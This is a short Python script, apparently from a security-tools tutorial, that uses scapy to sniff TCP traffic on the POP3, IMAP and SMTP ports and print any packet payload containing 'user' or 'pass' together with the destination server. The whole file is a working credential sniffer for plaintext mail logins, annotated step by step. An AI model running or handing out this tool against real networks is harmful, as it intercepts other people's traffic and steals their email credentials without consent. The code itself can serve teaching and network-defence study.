from scapy.all import sniff, TCP, IP

# We start by defining the callback function that will receive each sniffed packet
def packet_callback(packet):
    # 1) Check to make sure we have a data payload when the callback occurs
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        # 2) Check wether the playload contains the typical USER or PASS mail command
        if "user" in mypacket.lower() or "pass" in mypacket.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            # 3) If we find an authentication string ^ then we print out the server we are sending it to and the actual data bytes of the packet
            print(f"[*] {str(packet[TCP].payload)}")


def main():
    # 4) We are filtering using BPF syntax to grab traffic being sent to a couple of ports (110 POP3, 143 IMAP, and 25 STMP)_
    sniff(
        filter="tcp port 110 or tcp port 25 or tcp port 143",
        prn=packet_callback,
        store=0,
    )


if __name__ == "__main__":
    main()
